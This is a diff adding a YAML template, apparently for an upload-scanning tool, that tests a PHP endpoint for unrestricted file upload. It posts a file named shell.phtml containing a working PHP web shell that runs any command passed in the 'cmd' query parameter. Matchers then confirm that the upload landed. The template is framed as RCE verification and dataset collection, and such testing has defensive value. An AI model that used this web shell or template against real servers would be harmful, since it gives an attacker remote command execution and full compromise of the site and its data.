@@ -1,0 +1,45 @@
+name: "PHTML Simple RCE Test"
+description: "Single PHTML payload for RCE verification and dataset collection"
+author: "HaakimSec"
+version: "1.0"
+tech_stack: "php"
+
+target:
+  endpoint: "/upload_unrestricted.php"
+  method: "POST"
+  param: "file"
+
+headers:
+  User-Agent: "GoUpload-PHTML-Dataset/1.0"
+
+form_data:
+  upload: "1"
+
+payloads:
+  - name: "PHTML Shell Upload"
+    filename: "shell.phtml"
+    extension: ".phtml"
+    content_type: "application/x-php"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "rce"
+
+matchers:
+  - type: word
+    part: body
+    words:
+      - "File uploaded successfully"
+      - "Target file:"
+      - "uploads/shell.phtml"
+    condition: or
+
+success_indicators:
+  - "File uploaded successfully"
+  - "Target file:"
+
+failure_indicators:
+  - "Upload failed"
+  - "not allowed"
+  - "Error:"
